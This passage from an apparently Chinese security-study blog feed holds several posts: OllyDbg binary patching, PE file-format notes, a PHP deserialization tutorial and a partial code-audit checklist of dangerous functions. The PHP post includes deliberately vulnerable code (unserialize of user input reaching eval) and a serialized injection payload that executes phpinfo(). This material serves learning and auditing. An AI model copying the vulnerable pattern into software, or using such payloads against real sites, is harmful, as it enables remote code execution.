src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98.png" alt></p><p>这里在dump窗口中找到 409F50的位置，选中需要的位置并加入字符串</p><blockquote><p>值得注意的是 unicode 字符在内存中保存每个字符后面都得加上 0x00 ；</p><p>并且 unicode 字符串结尾需要 NULL 即需要两个 0x00；</p></blockquote><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%88%90%E5%8A%9F.png" alt></p><p>可见参数被我们修改为指向新建立的那一段内存中的字符串，函数成功执行为显示其他的内容。</p><h2 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h2><p>选中修改内容 -&gt; 右键 -&gt; Copy to executable file -&gt; 在弹出的窗口中右键 -&gt; Save file -&gt; 保存为exe文件</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这一篇知识简单的介绍了od的一些操作，并介绍了定位关键函数和修改字符串参数的一些具体操作，打好基础。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OD基本操作和RE基本思想&quot;&gt;&lt;a href=&quot;#OD基本操作和RE基本思想&quot; class=&quot;headerlink&quot; title=&quot;OD基本操作和RE基本思想&quot;&gt;&lt;/a&gt;OD基本操作和RE基本思想&lt;/h1&gt;&lt;p&gt;这篇写一些比较简单的知识，主要用来记录od的一些操作
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PE文件</title>
    <link href="http://bai-ren-1.github.io/2020/02/09/PE%E6%96%87%E4%BB%B6/"/>
    <id>http://bai-ren-1.github.io/2020/02/09/PE%E6%96%87%E4%BB%B6/</id>
    <published>2020-02-09T06:34:22.000Z</published>
    <updated>2020-02-16T09:20:12.446Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h1><p>继续二进制的研究。读了挺多书了，但还没做笔记。因为研究的是windows平台的逆向，先简单写一下PE文件的格式总结。</p><blockquote><p>实例都是十六进制表示，就不标注0x或者h了</p></blockquote><h2 id="PE概念"><a href="#PE概念" class="headerlink" title="PE概念"></a>PE概念</h2><p>PE是windows平台下可执行文件的格式</p><p>32位的可执行文件称为<strong>PE文件或者PE32</strong></p><p>64位的可执行文件称为<strong>PE+或者PE32+</strong></p><h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p>不同PE文件的主拓展名</p><ul><li>可执行系列 ：EXE 、SCR</li><li>库系列的 ：DLL、OCX、CPL、DRV</li><li>驱动程序系列 ：SYS、VXD</li><li>对象文件系列 ：OBJ</li></ul><h2 id="PE文件基本结构"><a href="#PE文件基本结构" class="headerlink" title="PE文件基本结构"></a>PE文件基本结构</h2><ul><li>PE头：DOS头到节区头的部分</li><li>PE体：PE头下的节区合称PE体</li><li>文件的内容一般可以分为<strong>代码 .text 、数据 .data 、资源 .rsrc节</strong>分别保存</li><li>各节区头定义了各节区在文件或者内存中的大小、位置、属性等</li></ul><p>notepad加载到内存中：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E8%A2%AB%E5%8A%A0%E8%BD%BD%E5%88%B0%E5%86%85%E5%AD%98.png" alt></p><h2 id="VA-amp-RVA-amp-ImageBase"><a href="#VA-amp-RVA-amp-ImageBase" class="headerlink" title="VA &amp; RVA &amp; ImageBase"></a>VA &amp; RVA &amp; ImageBase</h2><p>概念：</p><ul><li><strong>VA：进程虚拟内存的绝对地址</strong></li><li><strong>RVA：相对虚拟地址</strong></li><li><strong>ImageBase：RVA = VA - ImageBase</strong></li></ul><p>位置的不同表述：</p><ul><li>文件：使用偏移表示位置</li><li>内存：使用VA表示位置</li></ul><blockquote><p>32位windows中，每个进程分配有4GB的虚拟内存，因此进程中VA的范围是 00000000~FFFFFFFF</p></blockquote><h2 id="PE头结构"><a href="#PE头结构" class="headerlink" title="PE头结构"></a>PE头结构</h2><p><strong>PE头=DOS头+DOS存根+NT头（文件头+可选头）+节区头</strong></p><hr><h3 id="1-DOS头（IMAGE-DOS-HEADER）"><a href="#1-DOS头（IMAGE-DOS-HEADER）" class="headerlink" title="1. DOS头（IMAGE_DOS_HEADER）"></a>1. DOS头（IMAGE_DOS_HEADER）</h3><p>DOS头即是在PE头的最前面添加一个 IMAGE_DOS_HEADER 结构体，用来拓展已有的DOS EXE头。结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/dos%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>其中最重要的两个成员变量：</p><ul><li><strong>e_magic : DOS签名</strong>。</li><li><strong>e_lfanew ：指示NT头的偏移（即指向真正的PE头）</strong>。</li></ul><p>notepad++的DOS头：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84DOS%E5%A4%B4.png" alt></p><ul><li>开头WORD型的4D5A，即是e_magic，代表签名MZ；</li><li>末尾LONG型的00000110，即是e_lfanew，指向NT头；（Intel的小端序标识）</li></ul><hr><h3 id="2-DOS存根"><a href="#2-DOS存根" class="headerlink" title="2. DOS存根"></a>2. DOS存根</h3><p>位于DOS头的下方，为可选项且大小不固定。</p><p>notepad++的DOS存根：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84dos%E5%AD%98%E6%A0%B9.png" alt></p><blockquote><p>由于PE头中的DOS头中的e_lfanew指向的是NT头，说明中间的DOS存根是00000030 - 00000110的内容</p></blockquote><hr><h3 id="3-NT头（PE真正的头-IMAGE-NT-HEADERS）"><a href="#3-NT头（PE真正的头-IMAGE-NT-HEADERS）" class="headerlink" title="3. NT头（PE真正的头 - IMAGE_NT_HEADERS）"></a>3. NT头（PE真正的头 - IMAGE_NT_HEADERS）</h3><p>NT头 IMAGE_NT_HEADERS 的结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>具有三个成员：</p><ul><li><strong>签名 (504500，即PE00)</strong></li><li><strong>文件头</strong></li><li><strong>可选头</strong></li></ul><hr><h4 id="3-1-NT头中的文件头（IMAGE-FILE-HEADER）"><a href="#3-1-NT头中的文件头（IMAGE-FILE-HEADER）" class="headerlink" title="3-1. NT头中的文件头（IMAGE_FILE_HEADER）"></a>3-1. NT头中的文件头（IMAGE_FILE_HEADER）</h4><p>NT头中的文件头结构 IMAGE_FILE_HEADER 的结构体如下：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/nt%E5%A4%B4%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt></p><p>具有四个重要的成员：</p><ul><li>Machine：用于标识Machine码</li><li>NumberOfSections：用于指出文件中存在的节区数量</li><li>SizeOfOptionalHeader：用于指出 IMAGE_OPTIONAL_HEADER32 结构体的长度，其中IMAGE_OPTIONAL_HEADER32 是NT头最后一个成员</li><li>Characterstics：用于标识文件的属性，文件是否是可运行的形态，是否为DLL文件等信息</li></ul><p>notepad的文件头：</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt></p><hr><h4 id="3-2-NT头中的可选头（IMAGE-OPTIONAL-HEADER32）"><a href="#3-2-NT头中的可选头（IMAGE-OPTIONAL-HEADER32）" class="headerlink" title="3-2. NT头中的可选头（IMAGE_OPTIONAL_HEADER32）"></a>3-2. NT头中的可选头（IMAGE_OPTIONAL_HEADER32）</h4><p>IMAGE_OPTIONAL_HEADER32是PE头结构中最大的结构体</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E4%B8%AD%E7%9A%84%E5%8F%AF%E9%80%89%E5%A4%B41.png" alt></p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/NT%E5%A4%B4%E4%B8%AD%E7%9A%84%E5%8F%AF%E9%80%89%E5%A4%B42.png" alt></p><p>其中重要的成员：</p><ul><li>Magic：Magic为10B-20B</li><li><strong>AddressOfEntryPoint：持有EP的RVA值，指出程序最先执行的代码的起始地址</strong></li><li><strong>ImageBase：指出文件的优先装入地址</strong></li><li>SectionAlignment，FileAlignment：分别指出节区在磁盘中的最小单位和节区在内存中最小单位</li><li>SizeOfImage：指出了PE Image在虚拟内存中所占空间大小</li><li>SizeOfHeader：指出整个PE头的大小</li><li>Subsystem：区分系统驱动和普通的可执行文件</li><li>NumberOfRvaAndSize：指出DataDirectory数组的个数</li><li>DataDirectory：IMAGE_DATA_DIRECTORY结构体组成的数组</li></ul><hr><h3 id="4-节区头（-IMAGE-SECTION-HEADER）"><a href="#4-节区头（-IMAGE-SECTION-HEADER）" class="headerlink" title="4. 节区头（ IMAGE_SECTION_HEADER）"></a>4. 节区头（ IMAGE_SECTION_HEADER）</h3><p>节区头是由 IMAGE_SECTION_HEADER 结构体组成的数组。每个结构体对应着一个节区</p><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/%E8%8A%82%E5%8C%BA%E5%A4%B4%E7%BB%93%E6%9E%84%E4%BD%93.png" alt></p><p>其中重要的成员：</p><ul><li>VirtualSize：内存中节区所占大小</li><li><strong>VirtualAddress：内存中节区起始地址（其实是RVA）</strong></li><li>SizeOfRawData：磁盘文件中节区所占大小</li><li><strong>PointerToRawData：磁盘文件中节区起始位置</strong></li><li>Charaterstics：节区属性（bit OR）</li></ul><blockquote><p>VirtualAddress与PointerToRawData不带任何值，分别由SectionAlignment和FileAlignment确定</p></blockquote><blockquote><p>一般来说VirtualSize和SizeOfRawData具有不同的值，即磁盘中节区大小与加载到内存中的节区大小是不同的</p></blockquote><h2 id="PE由磁盘映射到内存"><a href="#PE由磁盘映射到内存" class="headerlink" title="PE由磁盘映射到内存"></a>PE由磁盘映射到内存</h2><p>PE文件加载到内存，每个<strong>节区</strong>都能完成<strong>内存地址与文件偏移</strong>之间的映射。这种映射一般叫做 RVA to RAW </p><p>计算这种映射的方法：</p><ul><li>查找RVA所在的节区</li><li>根据<strong>节区头</strong>使用下面公式计算文件偏移RAW</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAW - PointerToRawData = RVA - VirtualAddress</span><br><span class="line">即</span><br><span class="line">RAW = RVA - VirtualAddress + PpinterToRawData</span><br><span class="line">文件相对偏移 = 内存地址偏移 - 所在节区起始地址偏移 + 文件节区起始地址</span><br></pre></td></tr></table></figure><h2 id="RVA-转-RAW-练习"><a href="#RVA-转-RAW-练习" class="headerlink" title="RVA 转 RAW 练习"></a>RVA 转 RAW 练习</h2><p><img src="/2020/02/09/PE%E6%96%87%E4%BB%B6/notepad%E8%A2%AB%E5%8A%A0%E8%BD%BD%E5%88%B0%E5%86%85%E5%AD%98.png" alt></p><p><strong>Q1. RVA=5000,File Offset=?</strong></p><p>答：由RVA = 5000，加上内存中的基址可以得到该位置的VA是 01005000，对照内存地址可以知道它位于第一个节区即 .text 段。所以我们用该位置的偏移地址大小 RVA 减去 .text 段的偏移地址大小 1000 可以得到该位置在 .text 段的偏移大小为 4000。随后在文件中找到 .text 在文件中的起始位置并加上计算所得的 4000 得到在该位置在文件在文件中的偏移 RAW = 4000+400 = 4400</p><p><strong>Q2. RVA=13314,File Offset=?</strong></p><p>答：同上。RVA 找到对应节区为第三个节区即 .rsrc 段。减去内存中 .rsrc 的段偏移即 13314 - B000 =  8314。然后在文件找到 .rsrc 的起始位置为 8400 。加上刚刚所得的偏移即 8400 + 8314 = 10714</p><p><strong>Q3. RVA=ABA8,File Offset=?</strong></p><p>答：继续同上。RVA 找到对应的节区为第二个节区即 .data段。减去内存中 .data 的段偏移即 ABA8 - 9000 = 1BA8。然后在文件找到 .data 的起始位置为 7C00 。加上刚刚所得的偏移即 7C00 + 1BA8 = 97A8。</p><p>但是我们可以看到这样计算的话，这个位置在内存中位于第二个节区而在文件中却是位于第三个节区。这显然是错误的答案。这种情况表明 <strong>“无法定位与RVA相对应的RAW值”</strong>。</p><p>原因是：<strong>第二个节区的 VirtualSize 值比 SizeOfRawData 值大</strong>，具体的原因就在下面揭晓。</p><h2 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h2><p>Import Address Table，导入地址表。IAT 是一个表格，用来记录程序正在使用哪些库中的函数。</p><h2 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h2><p>Dynamic Linked Library，动态链接库。</p><ul><li>不要把库包含到程序中，单独组成DLL代码，需要时调用即可</li><li>内存映射技术使得加载后的DLL代码资源可以共享</li><li>更新库时只需要替换相关DLL即可</li></ul><p>加载DLL的方式</p><ul><li>显式链接：程序<strong>使用DLL时</strong>加载，使用完毕就释放内存</li><li>隐式链接：程序<strong>开始一同加载</strong>DLL，程序终止释放内存（IAT机制于此有关）</li></ul><h2 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE__IMPORT_DESCRIPTOR"></a>IMAGE__IMPORT_DESCRIPTOR</h2><p>该结构体记录了PE文件需要导入那些库文件</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>暂时先写到这里，后面还有好多…等慢慢补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PE文件&quot;&gt;&lt;a href=&quot;#PE文件&quot; class=&quot;headerlink&quot; title=&quot;PE文件&quot;&gt;&lt;/a&gt;PE文件&lt;/h1&gt;&lt;p&gt;继续二进制的研究。读了挺多书了，但还没做笔记。因为研究的是windows平台的逆向，先简单写一下PE文件的格式总结。&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://bai-ren-1.github.io/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-01-27T07:29:41.000Z</published>
    <updated>2020-01-27T10:00:45.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>从放假回到家里就一直没有学习，过年后突然感到空虚，就来总结一下反序列化的内容</p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><ul><li>序列化：将<code>对象或者数组（变量）</code>转换为一个<code>（可保存/传输）字符串</code></li><li>反序列化：将序列化后的得到的<code>字符串</code>反序列化为其<code>原始的对象结构</code></li></ul><p>php中常用的序列化和反序列化的函数有：</p><p><code>serialize、unserialize、json_encode、json_decode</code></p><h2 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h2><p>通过序列化操作，可以将<code>变量转化为字符串</code>。进而可以方便的进行<code>存储和传输</code>，减轻服务器的压力</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>当传给 unserialize() 的参数可控时，我们可以通过传入一个”精心”构造的序列化字符串，从而<code>控制对象</code>内部的<code>变量</code>甚至是<code>函数</code>，从而达成攻击的目的。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul><li>__construct() ：构造函数。当对象创建（new）时会自动调用。但在unserialize()时不会自动调用</li><li>__destruct() ：析构函数。在对象被销毁时会自动调用</li><li>__toString() ：当一个对象被当作一个字符串时就会调用。</li><li>__sleep() ：在对象被序列化之前运行</li><li>__wakeup() ：在对象被反序列化之后被调用</li></ul><p>调用的顺序如下面的程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'construct run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'destruct run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'wakeup run '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'sleep run '</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'toString run '</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'string '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$s_a = serialize($a);</span><br><span class="line"><span class="comment">#var_dump($s_a);</span></span><br><span class="line">$un_a = unserialize($s_a);</span><br><span class="line"><span class="keyword">echo</span> $un_a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行的结果如下所示：</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%BB%93%E6%9E%9C.png" alt></p><p>分析一下上面出现结果的顺序原因：</p><p>首先我调用了new实例化了一个<code>对象 $a</code> ，这时候就会自动调用了construct；</p><p>其次我对实例化出来的<code>对象 $a</code> 进行序列化操作，在序列化操作前会先执行 sleep函数，然后在对对象进行序列化得到<code>字符串$s_a</code>；</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%AD%97%E7%AC%A6%E4%B8%B2.png" alt></p><blockquote><p>注：上图中出现的字符串结果是去掉源码中注释符后重新运行代码由 var_dump($s_a) 所得</p></blockquote><p>然后执行到了unserialize 函数，调用后先对序列化<code>字符串 $s _a</code> 进行反序列化得到<code>对象 $un_a</code> 后再自动调用 wakeup方法；</p><p>然后调用echo函数，<code>$un_a 对象</code>被当作字符串，自动调用了toString方法；</p><p>最后程序执行结束，构造的两个<code>对象 $un_a 和 $a</code> 被释放，自动调用了两次析构函数destruct；</p><p>至此，我们对序列化和反序列化以及魔术方法的调用有了一定的认识</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>用一个在网上随便找来的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test =<span class="keyword">new</span> x1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"x1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class2  = <span class="keyword">new</span> maniac();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们定位到了反序列化操作 unserialize ，其中参数 test 是我们可控的变量</p><p>很明显，我们的目标是调用 类 x2 中的 eval 方法，但他<code>不是写在魔术方法</code>中，不能直接通过反序列化进行控制。</p><p>继续观察，看到了 maniac 类中的 destruct 魔术方法可以控制 $test 成员变量（一个类）中的 action 方法。</p><p>我们就可以构成利用链： 通过 test 参数传入 maniac 类的序列化字符串，其中的 test 指定为 x2 。这样当程序执行到 unserialize 的时候就会先反序列化操作，随后程序执行完毕，对象销毁而调用危险函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">EXP编写如下：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;test =<span class="keyword">new</span> x2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test2=<span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$answer = <span class="keyword">new</span> maniac();</span><br><span class="line">print_r(serialize($answer));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行后得到我们的 PAYLOAD:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"maniac"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;O:<span class="number">2</span>:<span class="string">"x2"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"test2"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里有个坑点就是 phpinfo(); 后面如果没有加上 ‘ ; ‘ ，就会执行失败。</p></blockquote><p>在wamp环境下执行的结果如下：</p><p><img src="/2020/01/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo%E7%BB%93%E6%9E%9C.png" alt></p><p>可以看到上面的利用链构造成功。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP的反序列只是弟弟知识，以后补上java的这部分的知识。把web的填满，再继续底层的研究，继续努力</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP反序列化&quot;&gt;&lt;a href=&quot;#PHP反序列化&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化&quot;&gt;&lt;/a&gt;PHP反序列化&lt;/h1&gt;&lt;p&gt;从放假回到家里就一直没有学习，过年后突然感到空虚，就来总结一下反序列化的内容&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计函数</title>
    <link href="http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0/"/>
    <id>http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0/</id>
    <published>2019-12-27T14:59:56.000Z</published>
    <updated>2020-02-19T06:27:08.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计函数"><a href="#代码审计函数" class="headerlink" title="代码审计函数"></a>代码审计函数</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL较多发生于下面这些功能点上：</p><ul><li>登录页面</li><li>获取HTTP头（user-agent/client-ip)</li><li>订单处理（常发生二次注入）</li></ul><blockquote><p> 二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入 。</p><p>即处理这个输入时进行了转义，但是存储进数据库中又变成了脏数据，然后使用到这个脏数据时就会发生注入。</p></blockquote><p>普通注入关注函数：</p><ul><li>select from</li><li>mysql_connect</li><li>mysql_query</li><li>mysql_fetch_row</li><li>update</li><li>insert</li><li>delete</li></ul><p>编码注入关注函数：</p><ul><li>urldecode/rawurldecode</li><li>mysql_set_charset(‘GBK’)</li></ul><p>防范方法：</p><ul><li>gpc/runtime魔术引号 （PHP配置）</li><li>转义类函数<ul><li>addslashes对单双引号、反斜杠和空字符进行转义</li><li>mysq_ [ real_ ] escape_string同理对指定字符串进行转义</li></ul></li><li>intval等字符转换（适用于int型注入）</li><li>PDO预编译</li></ul><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF关注函数：</p><ul><li>curl</li><li>file_get_content</li><li>fsockopen</li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS漏洞关键在于：寻找没有被过滤的参数和输出这些参数的输出函数</p><p>XSS关注函数：</p><ul><li>print</li><li>print_r</li><li>echo</li><li>printf</li><li>sprinf</li><li>sprintf</li><li>die</li><li>var_dump</li><li>var_export</li></ul><p>防范：</p><ul><li>对特殊字符 ‘  “  &lt; &gt; \ : and &amp; # 在输出和二次调用时进行HTML实体转义</li><li>黑白名单方式拦截标签事件属性（自定义正则规则）</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF主要是用于越权，常发生于控制权限的地方：</p><ul><li>管理后台</li><li>会员中心</li><li>论坛帖子</li><li>交易管理</li></ul><p>关注点：</p><ul><li><p>黑盒方法：</p><ul><li>抓包看有没有token</li><li>去掉refer再重发一次看响应是否一样</li></ul></li><li><p>白盒方法：</p><ul><li>查看引用的核心基础文件有没有token关键字或者验证操作</li></ul></li></ul><p>防范方法：</p><ul><li>token</li><li>验证码</li></ul><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含关注的地方：模块加载，cache调用的地方</p><p>文件包含关注函数：</p><ul><li>include</li><li>include_once</li><li>require</li><li>require_once</li></ul><blockquote><p>once ： 只包含一次</p><p>require ： 包含并执行，报错就退出程序</p><p>include ： 包含并执行，报错也继续执行下面的代码</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" 